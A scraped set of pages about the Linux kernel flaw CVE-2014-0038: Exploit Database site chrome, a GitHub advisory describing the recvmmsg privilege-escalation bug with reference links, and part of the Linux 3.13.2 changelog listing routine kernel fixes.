[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from github.com_5d90cee9_20250126_034944.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-wvfw-q8jv-g9r2)

**CVE-2014-0038**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-wvfw-q8jv-g9r2)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2014-0038](/advisories/GHSA-wvfw-q8jv-g9r2)

## The compat\_sys\_recvmmsg function in net/compat.c in the...

Moderate severity

Unreviewed

Published
May 14, 2022
to the GitHub Advisory Database
•
Updated Feb 20, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-wvfw-q8jv-g9r2/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

The compat\_sys\_recvmmsg function in net/compat.c in the Linux kernel before 3.13.2, when CONFIG\_X86\_X32 is enabled, allows local users to gain privileges via a recvmmsg system call with a crafted timeout pointer parameter.

### References

* <https://nvd.nist.gov/vuln/detail/CVE-2014-0038>
* [torvalds/linux@2def2ef](https://github.com/torvalds/linux/commit/2def2ef2ae5f3990aabdbe8a755911902707d268)
* <https://bugzilla.redhat.com/show_bug.cgi?id=1060023>
* <https://code.google.com/p/chromium/issues/detail?id=338594>
* <https://github.com/saelo/cve-2014-0038>
* <https://www.exploit-db.com/exploits/40503/>
* <http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commit;h=2def2ef2ae5f3990aabdbe8a755911902707d268>
* <http://lists.opensuse.org/opensuse-security-announce/2014-02/msg00002.html>
* <http://lists.opensuse.org/opensuse-security-announce/2014-02/msg00003.html>
* <http://pastebin.com/raw.php?i=DH3Lbg54>
* <http://secunia.com/advisories/56669>
* <http://www.exploit-db.com/exploits/31346>
* <http://www.exploit-db.com/exploits/31347>
* <http://www.kernel.org/pub/linux/kernel/v3.x/ChangeLog-3.13.2>
* <http://www.mandriva.com/security/advisories?name=MDVSA-2014:038>
* <http://www.openwall.com/lists/oss-security/2014/01/31/2>
* <http://www.securityfocus.com/bid/65255>
* <http://www.ubuntu.com/usn/USN-2094-1>
* <http://www.ubuntu.com/usn/USN-2095-1>
* <http://www.ubuntu.com/usn/USN-2096-1>
* <http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git%3Ba=commit%3Bh=2def2ef2ae5f3990aabdbe8a755911902707d268>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2014-0038)
Feb 6, 2014

Published to the GitHub Advisory Database
May 14, 2022

Last updated
Feb 20, 2023

### Severity

Moderate

### EPSS score

0.054%

# Exploit Prediction Scoring System (EPSS)

This score estimates the probability of this vulnerability being exploited within the next 30 days.
Data provided by [FIRST](https://www.first.org/epss/user-guide).

 (25th percentile)

### Weaknesses

[CWE-20](/advisories?query=cwe%3A20)

### CVE ID

CVE-2014-0038

### GHSA ID

GHSA-wvfw-q8jv-g9r2

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-wvfw-q8jv-g9r2/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugzilla.novell.com_a4eb272b_20250126_034936.html ===




=== Content from bugzilla.novell.com_62d14315_20250126_034920.html ===




=== Content from www.kernel.org_a704a605_20250124_220342.html ===
commit fd82174a6967b34e1f478469269f161f7b1e688b
Author: Greg Kroah-Hartman
Date: Thu Feb 6 11:42:22 2014 -0800
Linux 3.13.2
commit 31752e89b1e728d672eaafaa7869e7c0673ae9f6
Author: Borislav Petkov
Date: Wed Jan 15 00:07:11 2014 +0100
x86, cpu, amd: Add workaround for family 16h, erratum 793
commit 3b56496865f9f7d9bcb2f93b44c63f274f08e3b6 upstream.
This adds the workaround for erratum 793 as a precaution in case not
every BIOS implements it. This addresses CVE-2013-6885.
Erratum text:
[Revision Guide for AMD Family 16h Models 00h-0Fh Processors,
document 51810 Rev. 3.04 November 2013]
793 Specific Combination of Writes to Write Combined Memory Types and
Locked Instructions May Cause Core Hang
Description
Under a highly specific and detailed set of internal timing
conditions, a locked instruction may trigger a timing sequence whereby
the write to a write combined memory type is not flushed, causing the
locked instruction to stall indefinitely.
Potential Effect on System
Processor core hang.
Suggested Workaround
BIOS should set MSR
C001\_1020[15] = 1b.
Fix Planned
No fix planned
[ hpa: updated description, fixed typo in MSR name ]
Signed-off-by: Borislav Petkov
Link: http://lkml.kernel.org/r/20140114230711.GS29865@pd.tnic
Tested-by: Aravind Gopalakrishnan
Signed-off-by: H. Peter Anvin
Signed-off-by: Greg Kroah-Hartman
commit 8698e6867596eaaa98535f0e4ee801a076633928
Author: Paul Mackerras
Date: Sat Jan 18 21:14:47 2014 +1100
powerpc: Make sure "cache" directory is removed when offlining cpu
commit 91b973f90c1220d71923e7efe1e61f5329806380 upstream.
The code in remove\_cache\_dir() is supposed to remove the "cache"
subdirectory from the sysfs directory for a CPU when that CPU is
being offlined. It tries to do this by calling kobject\_put() on
the kobject for the subdirectory. However, the subdirectory only
gets removed once the last reference goes away, and the reference
being put here may well not be the last reference. That means
that the "cache" subdirectory may still exist when the offlining
operation has finished. If the same CPU subsequently gets onlined,
the code tries to add a new "cache" subdirectory. If the old
subdirectory has not yet been removed, we get a WARN\_ON in the
sysfs code, with stack trace, and an error message printed on the
console. Further, we ultimately end up with an online cpu with no
"cache" subdirectory.
This fixes it by doing an explicit kobject\_del() at the point where
we want the subdirectory to go away. kobject\_del() removes the sysfs
directory even though the object still exists in memory. The object
will get freed at some point in the future. A subsequent onlining
operation can create a new sysfs directory, even if the old object
still exists in memory, without causing any problems.
Signed-off-by: Paul Mackerras
Signed-off-by: Benjamin Herrenschmidt
Signed-off-by: Greg Kroah-Hartman
commit 5326f5fc83fecf025bf211f429373d7bed0f7582
Author: Srivatsa S. Bhat
Date: Mon Dec 30 17:05:34 2013 +0530
powerpc: Fix the setup of CPU-to-Node mappings during CPU online
commit d4edc5b6c480a0917e61d93d55531d7efa6230be upstream.
On POWER platforms, the hypervisor can notify the guest kernel about dynamic
changes in the cpu-numa associativity (VPHN topology update). Hence the
cpu-to-node mappings that we got from the firmware during boot, may no longer
be valid after such updates. This is handled using the arch\_update\_cpu\_topology()
hook in the scheduler, and the sched-domains are rebuilt according to the new
mappings.
But unfortunately, at the moment, CPU hotplug ignores these updated mappings
and instead queries the firmware for the cpu-to-numa relationships and uses
them during CPU online. So the kernel can end up assigning wrong NUMA nodes
to CPUs during subsequent CPU hotplug online operations (after booting).
Further, a particularly problematic scenario can result from this bug:
On POWER platforms, the SMT mode can be switched between 1, 2, 4 (and even 8)
threads per core. The switch to Single-Threaded (ST) mode is performed by
offlining all except the first CPU thread in each core. Switching back to
SMT mode involves onlining those other threads back, in each core.
Now consider this scenario:
1. During boot, the kernel gets the cpu-to-node mappings from the firmware
and assigns the CPUs to NUMA nodes appropriately, during CPU online.
2. Later on, the hypervisor updates the cpu-to-node mappings dynamically and
communicates this update to the kernel. The kernel in turn updates its
cpu-to-node associations and rebuilds its sched domains. Everything is
fine so far.
3. Now, the user switches the machine from SMT to ST mode (say, by running
ppc64\_cpu --smt=1). This involves offlining all except 1 thread in each
core.
4. The user then tries to switch back from ST to SMT mode (say, by running
ppc64\_cpu --smt=4), and this involves onlining those threads back. Since
CPU hotplug ignores the new mappings, it queries the firmware and tries to
associate the newly onlined sibling threads to the old NUMA nodes. This
results in sibling threads within the same core getting associated with
different NUMA nodes, which is incorrect.
The scheduler's build-sched-domains code gets thoroughly confused with this
and enters an infinite loop and causes soft-lockups, as explained in detail
in commit 3be7db6ab (powerpc: VPHN topology change updates all siblings).
So to fix this, use the numa\_cpu\_lookup\_table to remember the updated
cpu-to-node mappings, and use them during CPU hotplug online operations.
Further, we also need to ensure that all threads in a core are assigned to a
common NUMA node, irrespective of whether all those threads were online during
the topology update. To achieve this, we take care not to use cpu\_sibling\_mask()
since it is not hotplug invariant. Instead, we use cpu\_first\_sibling\_thread()
and set up the mappings manually using the 'threads\_per\_core' value for that
particular platform. This helps us ensure that we don't hit this bug with any
combination of CPU hotplug and SMT mode switching.
Signed-off-by: Srivatsa S. Bhat
Signed-off-by: Benjamin Herrenschmidt
Signed-off-by: Greg Kroah-Hartman
commit 000bed8a41424d1fca84c047dbf7fa260af87087
Author: David Sterba
Date: Wed Jan 15 18:15:52 2014 +0100
btrfs: restrict snapshotting to own subvolumes
commit d024206133ce21936b3d5780359afc00247655b7 upstream.
Currently, any user can snapshot any subvolume if the path is accessible and
thus indirectly create and keep files he does not own under his direcotries.
This is not possible with traditional directories.
In security context, a user can snapshot root filesystem and pin any
potentially buggy binaries, even if the updates are applied.
All the snapshots are visible to the administrator, so it's possible to
verify if there are suspicious snapshots.
Another more practical problem is that any user can pin the space used
by eg. root and cause ENOSPC.
Original report:
https://bugs.launchpad.net/ubuntu/+source/apparmor/+bug/484786
Signed-off-by: David Sterba
Signed-off-by: Josef Bacik
Signed-off-by: Chris Mason
Signed-off-by: Greg Kroah-Hartman
commit 5d4d57d2f5cd27b27505d24766fa0f0952e2a19b
Author: Chris Mason
Date: Thu Jan 9 17:28:00 2014 -0800
Btrfs: setup inode location during btrfs\_init\_inode\_locked
commit 90d3e592e99b8e374ead2b45148abf506493a959 upstream.
We have a race during inode init because the BTRFS\_I(inode)->location is setup
after the inode hash table lock is dropped. btrfs\_find\_actor uses the location
field, so our search might not find an existing inode in the hash table if we
race with the inode init code.
This commit changes things to setup the location field sooner. Also the find actor now
uses only the location objectid to match inodes. For inode hashing, we just
need a unique and stable test, it doesn't have to reflect the inode numbers we
show to userland.
Signed-off-by: Chris Mason
Signed-off-by: Greg Kroah-Hartman
commit fb0f7df29d50332f5b79c84e954d30acf7961884
Author: Wang Shilong
Date: Tue Jan 7 17:26:58 2014 +0800
Btrfs: handle EAGAIN case properly in btrfs\_drop\_snapshot()
commit 90515e7f5d7d24cbb2a4038a3f1b5cfa2921aa17 upstream.
We may return early in btrfs\_drop\_snapshot(), we shouldn't
call btrfs\_std\_err() for this case, fix it.
Signed-off-by: Wang Shilong
Signed-off-by: Josef Bacik
Signed-off-by: Chris Mason
Signed-off-by: Greg Kroah-Hartman
commit 0bf44d6862c3d4551fa442b8913421d43933d067
Author: Andy Grover
Date: Fri Jan 24 16:18:54 2014 -0800
target/iscsi: Fix network portal creation race
commit ee291e63293146db64668e8d65eb35c97e8324f4 upstream.
When creating network portals rapidly, such as when restoring a
configuration, LIO's code to reuse existing portals can return a false
negative if the thread hasn't run yet and set np\_thread\_state to
ISCSI\_NP\_THREAD\_ACTIVE. This causes an error in the network stack
when attempting to bind to the same address/port.
This patch sets NP\_THREAD\_ACTIVE before the np is placed on g\_np\_list,
so even if the thread hasn't run yet, iscsit\_get\_np will return the
existing np.
Also, convert np\_lock -> np\_mutex + hold across adding new net portal
to g\_np\_list to prevent a race where two threads may attempt to create
the same network portal, resulting in one of them failing.
(nab: Add missing mutex\_unlocks in iscsit\_add\_np failure paths)
(DanC: Fix incorrect spin\_unlock -> spin\_unlock\_bh)
Signed-off-by: Andy Grover
Signed-off-by: Nicholas Bellinger
Signed-off-by: Greg Kroah-Hartman
commit e00d98a6df6f455e790c3cef4e9e78926d6f6ba7
Author: Nicholas Bellinger
Date: Fri Jan 10 02:06:59 2014 +0000
iscsi-target: Pre-allocate more tags to avoid ack starvation
commit 4a4caa29f1abcb14377e05d57c0793d338fb945d upstream.
This patch addresses an traditional iscsi-target fabric ack starvation
issue where iscsit\_allocate\_cmd() -> percpu\_ida\_alloc\_state() ends up
hitting slow path percpu-ida code, because iscsit\_ack\_from\_expstatsn()
is expected to free ack'ed tags after tag allocation.
This is done to take into account the tags waiting to be acknowledged
and released in iscsit\_ack\_from\_expstatsn(), but who's number are not
directly limited by the CmdSN Window queue\_depth being enforced by
the target.
So that said, this patch bumps up the pre-allocated number of
per session tags to:
(max(queue\_depth, ISCSIT\_MIN\_TAGS) \* 2) + ISCSIT\_EXTRA\_TAGS
for good measure to avoid the percpu\_ida\_alloc\_state() slow path.
Signed-off-by: Nicholas Bellinger
Signed-off-by: Greg Kroah-Hartman
commit f91c20513353a088257f2b1264d497b3dcfe81de
Author: Asias He
Date: Thu Jan 16 10:18:48 2014 +1030
virtio-scsi: Fix hotcpu\_notifier use-after-free with virtscsi\_freeze
commit f466f75385369a181409e46da272db3de6f5c5cb upstream.
vqs are freed in virtscsi\_freeze but the hotcpu\_notifier is not
unregistered. We will have a use-after-free usage when the notifier
callback is called after virtscsi\_freeze.
Fixes: 285e71ea6f3583a85e27cb2b9a7d8c35d4c0d558
("virtio-scsi: reset virtqueue affinity when doing cpu hotplug")
Signed-off-by: Asias He
Reviewed-by: Paolo Bonzini
Signed-off-by: Jason Wang
Signed-off-by: Rusty Russell
Signed-off-by: Greg Kroah-Hartman
commit 8507df5828d2335c6a07c87804e18df0ff2a4af1
Author: Dan Carpenter
Date: Wed Nov 13 10:48:11 2013 +0300
SCSI: qla4xxx: overflow in qla4xxx\_set\_chap\_entry()
commit 3c60cfd73966797746530768d66597d025a69804 upstream.
We should cap the size of memcpy() because it comes from the network
and can't be trusted.
Fixes: 26ffd7b45fe9 ('[SCSI] qla4xxx: Add support to set CHAP entries')
Signed-off-by: Dan Carpenter
Acked-by: Vikas Chaudhary
Signed-off-by: James Bottomley
Signed-off-by: Greg Kroah-Hartman
commit e88f3608e8230b5d82353701656e0f60166114b6
Author: Vijaya Mohan Guvva
Date: Wed Dec 4 05:43:58 2013 -0800
SCSI: bfa: Chinook quad port 16G FC HBA claim issue
commit dcaf9aed995c2b2a49fb86bbbcfa2f92c797ab5d upstream.
Bfa driver crash is observed while pushing the firmware on to chinook
quad port card due to uninitialized bfi\_image\_ct2 access which gets
initialized only for CT2 ASIC based cards after request\_firmware().
For quard port chinook (CT2 ASIC based), bfi\_image\_ct2 is not getting
initialized as there is no check for chinook PCI device ID before
request\_firmware and instead bfi\_image\_cb is initialized as it is the
default case for card type check.
This patch includes changes to read the right firmware for quad port chinook.
Signed-off-by: Vijaya Mohan Guvva
Signed-off-by: James Bottomley
Signed-off-by: Greg Kroah-Hartman
commit 6d9541431906f495c56ffaf0d5f9c62b919b8491
Author: Thomas Pugliese
Date: Mon Dec 9 13:40:29 2013 -0600
usb: core: get config and string descriptors for unauthorized devices
commit 83e83ecb79a8225e79bc8e54e9aff3e0e27658a2 upstream.
There is no need to skip querying the config and string descriptors for
unauthorized WUSB devices when usb\_new\_device is called. It is allowed
by WUSB spec. The only action that needs to be delayed until
authorization time is the set config. This change allows user mode
tools to see the config and string descriptors earlier in enumeration
which is needed for some WUSB devices to function properly on Android
systems. It also reduces the amount of divergent code paths needed
for WUSB devices.
Signed-off-by: Thomas Pugliese
Signed-off-by: Greg Kroah-Hartman
commit 3e700ec6144244a484c787f403c8299125db86e3
Author: Mikulas Patocka
Date: Wed Jan 29 00:10:44 2014 +0100
hpfs: remember free space
commit 2cbe5c76fc5e38e9af4b709593146e4b8272b69e upstream.
Previously, hpfs scanned all bitmaps each time the user asked for free
space using statfs. This patch changes it so that hpfs scans the
bitmaps only once, remembes the free space and on next invocation of
statfs it returns the value instantly.
New versions of wine are hammering on the statfs syscall very heavily,
making some games unplayable when they're stored on hpfs, with load
times in minutes.
This should be backported to the stable kernels because it fixes
user-visible problem (excessive level load times in wine).
Signed-off-by: Mikulas Patocka
Signed-off-by: Linus Torvalds
Signed-off-by: Greg Kroah-Hartman
commit 8a8c97e6cc6a7b311617a32fe182ec6a69a9e9af
Author: Takashi Iwai
Date: Mon Jan 13 12:40:07 2014 +0100
ALSA: hda - Don't set indep\_hp flag for old AD codecs
commit cbd209f41ea5f39394de5c1fe2dd9aa54a9c5744 upstream.
Some old AD codecs don't like the independent HP handling, either it
contains a single DAC (AD1981) or it mandates the mixer routing
(AD1986A). This patch removes the indep\_hp flag for such codecs.
Bugzilla: https://bugzilla.kernel.org/show\_bug.cgi?id=68081
Signed-off-by: Takashi Iwai
Signed-off-by: Greg Kroah-Hartman
commit 946c119beade4f44113c09974410af82e92fcc3c
Author: Mihai Caraman
Date: Thu Jan 9 17:01:05 2014 +0200
KVM: PPC: e500: Fix bad address type in deliver\_tlb\_misss()
commit 70713fe315ed14cd1bb07d1a7f33e973d136ae3d upstream.
Use gva\_t instead of unsigned int for eaddr in deliver\_tlb\_miss().
Signed-off-by: Mihai Caraman
Signed-off-by: Alexander Graf
Signed-off-by: Greg Kroah-Hartman
commit a03e895e05a2ee3939f559e2644f762d04b3972a
Author: Andreas Schwab
Date: Mon Dec 30 15:36:56 2013 +0100
KVM: PPC: Book3S HV: use xics\_wake\_cpu only when defined
commit 48eaef0518a565d3852e301c860e1af6a6db5a84 upstream.
Signed-off-by: Andreas Schwab
Signed-off-by: Alexander Graf
Signed-off-by: Greg Kroah-Hartman
commit 625988d38c57d3ef867195a8941820677a939035
Author: Helge Deller
Date: Fri Jan 31 21:33:17 2014 +0100
parisc: fix cache-flushing
commit 57737c49dd72c96cfbcd4f66559f3ffc399aeb4f upstream.
This commit:
f8dae00684d678afa13041ef170cecfd1297ed40: parisc: Ensure full cache coherency for kmap/kunmap
caused negative caching side-effects, e.g. hanging processes with expect and
too many inequivalent alias messages from flush\_dcache\_page() on Debian 5 systems.
This patch now partly reverts it and has been in production use on our debian buildd
makeservers since a week without any major problems.
Signed-off-by: Helge Deller
Signed-off-by: John David Anglin
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit 3b11ff52d571e4bac05c33c64653afdf36c5d63d
Author: Helge Deller
Date: Fri Jan 31 15:39:40 2014 +0100
parisc/sti\_console: prefer Linux fonts over built-in ROM fonts
commit 8a10bc9d27ceb084b0d8be621a033a475eb9fdfd upstream.
The built-in ROM fonts lack many necessary ASCII characters, which is
why it makes sens to prefer the Linux fonts instead if they are
available. This makes consoles on STI graphics cards which are not
supported by the stifb driver (e.g. Visualize FXe) looks much nicer.
Signed-off-by: Helge Deller
Signed-off-by: Greg Kroah-Hartman
commit 2a98c6f081a98abdb3a287788f4cbca3ae0db1fe
Author: Mikulas Patocka
Date: Wed Jan 22 23:04:33 2014 -0500
alpha: fix broken network checksum
commit 0ef38d70d4118b2ce1a538d14357be5ff9dc2bbd upstream.
The patch 3ddc5b46a8e90f3c9251338b60191d0a804b0d92 breaks networking on
alpha (there is a follow-up fix 5cfe8f1ba5eebe6f4b6e5858cdb1a5be4f3272a6,
but networking is still broken even with the second patch).
The patch 3ddc5b46a8e90f3c9251338b60191d0a804b0d92 makes
csum\_partial\_copy\_from\_user check the pointer with access\_ok. However,
csum\_partial\_copy\_from\_user is called also from csum\_partial\_copy\_nocheck
and csum\_partial\_copy\_nocheck is called on kernel pointers and it is
supposed not to check pointer validity.
This bug results in ssh session hangs if the system is loaded and bulk
data are printed to ssh terminal.
This patch fixes csum\_partial\_copy\_nocheck to call set\_fs(KERNEL\_DS), so
that access\_ok in csum\_partial\_copy\_from\_user accepts kernel-space
addresses.
Signed-off-by: Mikulas Patocka
Signed-off-by: Matt Turner
Signed-off-by: Greg Kroah-Hartman
commit 8fabad704e223548edb974819d2bd5d942d049b6
Author: Dong Aisheng
Date: Thu Dec 26 15:23:53 2013 +0800
mmc: sdhci-esdhc-imx: fix access hardirq-unsafe lock in atomic context
commit a974862faee199cba3ff36b5a148df5fd34bd1e7 upstream.
